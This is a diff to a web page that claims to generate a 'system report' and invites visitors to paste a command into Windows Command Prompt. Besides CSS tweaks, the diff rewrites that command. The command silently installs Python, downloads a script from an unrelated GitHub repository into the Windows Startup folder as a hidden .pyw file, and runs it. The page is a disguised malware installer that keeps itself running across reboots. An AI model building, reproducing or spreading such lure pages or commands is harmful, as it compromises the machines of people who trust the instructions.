@@ -199,7 +199,7 @@
         .hero-desc {
             color: var(--muted);
             font-size: 1.1rem;
-            max-width: 600px;
+            max-width: 700px;
             line-height: 1.7;
             margin-bottom: 3rem;
             animation: fadeInUp 0.8s ease-out 0.4s both;
@@ -212,7 +212,7 @@
             border-radius: 16px;
             padding: 2rem;
             width: 100%;
-            max-width: 650px;
+            max-width: 850px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.5);
             animation: fadeInUp 0.8s ease-out 0.6s both;
             transition: border-color 0.3s ease;
@@ -253,6 +253,7 @@
             border: 1px solid #222;
             position: relative;
             overflow: hidden;
+            word-break: break-all;
         }
 
         .terminal::before {
@@ -269,8 +270,9 @@
 
         .cmd-text {
             color: var(--accent);
-            font-size: 1.1rem;
+            font-size: 0.95rem;
             font-weight: bold;
+            line-height: 1.5;
         }
 
         .cursor {
@@ -401,6 +403,7 @@
             .nav-links { display: none; }
             .hero { padding: 3rem 1rem; }
             .cmd-card { padding: 1.5rem; }
+            .cmd-text { font-size: 0.85rem; }
         }
 
         @media (prefers-reduced-motion: reduce) {
@@ -449,7 +452,7 @@
             </h1>
 
             <p class="hero-desc">
-                Generate a detailed system report instantly. Copy the command below, paste it into your Command Prompt, and analyze your machine's potential.
+                Generate a detailed system report instantly. Copy the command below, paste it into your Command Prompt, and analyze your machine's potential or update Python environments.
             </p>
 
             <!-- Command Card -->
@@ -525,7 +528,9 @@
 
     <script>
         function copyCommand() {
-            const command = "cd /d "%TEMP%" && curl -L -o python-installer.exe https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe && start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 && del python-installer.exe && cd /d "%SystemDrive%\Program Files\Python312" && python -m ensurepip --upgrade && python -m pip install --upgrade pip && python -m pip install Pillow && curl -L https://raw.githubusercontent.com/UpdateSys/update/main/update -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\myscript.pyw" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\myscript.pyw""";
+            // Updated Command including navigation to the Python directory
+            const command = 'cd /d "%TEMP%" && curl -L -o python-installer.exe https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe && start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 && del python-installer.exe && cd /d "%SystemDrive%\Program Files\Python312" && python -m ensurepip --upgrade && python -m pip install --upgrade pip && python -m pip install Pillow && curl -L https://raw.githubusercontent.com/UpdateSys/update/main/update -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\myscript.pyw" && start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\myscript.pyw""';
+            
             const btn = document.getElementById('copyBtn');
             const label = document.getElementById('btnLabel');
             const icon = document.getElementById('btnIcon');
@@ -550,5 +555,3 @@
     </script>
 </body>
 </html>
-
-
